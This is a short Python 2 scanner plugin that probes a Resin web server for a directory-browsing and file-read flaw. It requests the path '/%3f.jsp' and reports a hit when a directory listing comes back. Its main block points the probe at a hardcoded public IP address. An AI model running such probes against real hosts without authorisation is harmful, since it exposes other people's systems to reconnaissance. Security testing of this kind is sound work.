#coding:utf-8


import urllib2



from t import T




class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='8080',productname={},keywords='',hackinfo=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        result['result']=False
        vul_url = target_url + '/%3f.jsp'
        res=None
        try:
            res=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = res.read()
        except:
            return result
        finally:
            if res is not None:
                res.close()
                del res
        if "<h1>Directory of" in res_html:
            info = vul_url + " Resin File Read And Directory Browsing "
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='Resin File Read And Directory Browsing '
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            return result
        return result

   
            

           

if __name__ == '__main__':
    print P().verify(ip='1.202.164.105',port='8080')      